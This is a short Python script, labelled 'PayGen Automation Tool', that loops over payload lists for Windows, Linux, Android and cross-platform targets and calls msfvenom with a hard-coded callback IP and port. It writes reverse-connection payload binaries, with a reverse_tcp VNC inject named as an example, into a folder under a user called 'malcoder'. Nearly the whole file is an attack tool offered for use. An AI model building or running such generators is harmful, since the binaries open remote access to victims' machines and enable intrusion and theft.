##AUTHOR = VISHNU##
import os

os.system("clear")


print('''
███████   █████╗  ██╗   ██╗  ██████╗ ███████╗ ███╗   ██╗
██╔══██  ██╔══██╗ ╚██╗ ██╔╝ ██╔════╝ ██╔════╝ ████╗  ██║
███████  ███████║  ╚████╔╝  ██║      █████╗   ██╔██╗ ██║
██║      ██╔══██║   ╚██╔╝   ██║   ██ ██╔══╝   ██║╚██╗██║
██║      ██║  ██║    ██║    ╚███████ ███████╗ ██║ ╚████║
╚═╝      ╚═╝  ╚═╝    ╚═╝     ╚═════╝ ╚══════╝ ╚═╝  ╚═══╝Automation Tool
''')                                                                     




print("============================================")
print("           Platforms                \n")
print("[1] Windows ")
print("[2] Linux")
print("[3] Andriod")
print("[4] Xplatforms")
print("============================================\n\n")

print("Be ready with payload list example : windows/x64/vncinject/reverse_tcp_rc4 -archs -platform -encoders")

user = input("Choose Platform: ")

print("\n")
ip = '192.168.248.133' #Local IP address
port = '42271' #Local port
x = 'a'


if user == '1':
    print("Generating Payload Please Wait....\n")
    with open('win_pay.txt', 'r') as istr:
        for line in istr:
            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " -f exe > /home/malcoder/Desktop/payload/" + x + "")
            x = x + 'a'

elif user == '2':
    print("Generating Payload Please Wait....\n")
    with open('lin_pay.txt', 'r') as istr:
        for line in istr:
            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " -f elf > /home/malcoder/Desktop/payload/" + x + "")
            x = x + 'a'
    
elif user == '3':
    print("Generating Payload Please Wait....\n")
    with open('and_pay.txt', 'r') as istr:
        for line in istr:
            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " > /home/malcoder/Desktop/payload/" + x + "")
            x = x + 'a'  

elif user == '4':
    print("Generating Payload Please Wait....\n")
    with open('xpl_pay.txt', 'r') as istr:
        for line in istr:
            line = os.system("msfvenom -p "+line.rstrip('\n')+" LHOST=" + ip + " LPORT=" + port + " > /home/malcoder/Desktop/payload/" + x + "")
            x = x + 'a'

else:
    print("I think you was not in mood!!!")    
